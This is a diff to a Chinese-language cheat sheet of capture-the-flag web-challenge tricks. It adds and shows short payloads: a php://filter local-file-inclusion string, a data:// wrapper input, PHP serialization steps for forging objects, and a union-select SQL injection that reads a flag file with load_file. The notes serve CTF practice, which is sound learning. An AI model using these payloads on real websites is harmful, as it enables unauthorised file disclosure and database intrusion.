@@ -1,4 +1,4 @@
-* web题目，flag文件一般认为在根目录，web服务文件在／var/www/html/目录。
+* web题目，flag文件一般认为在根目录，web服务文件在／var/www/html/目录。上传payload后看不到flag时，看下源码，说不定就有了。
 
 * 在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符.
 
@@ -36,6 +36,8 @@
 
   ```php
   YOUR_URL?file=php://filter/convert.base64-encode/resource=flag.php
+
+  ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
   ```
 
 * PHP
@@ -62,6 +64,15 @@
   //O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}
   //Name后面的2在链接中要改成3
   ?>
+  ```
+
+* php 序列化 反序列化
+
+  ```php
+  #在本地执行出序列化结果，然后构造payload
+  $password=new Flag();
+  $password = serialize($password);
+  echo $password; 
   ```
 
 * search by python 
@@ -121,5 +132,7 @@
   ```
   /view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
   ```
+
+* ​
 
   ​
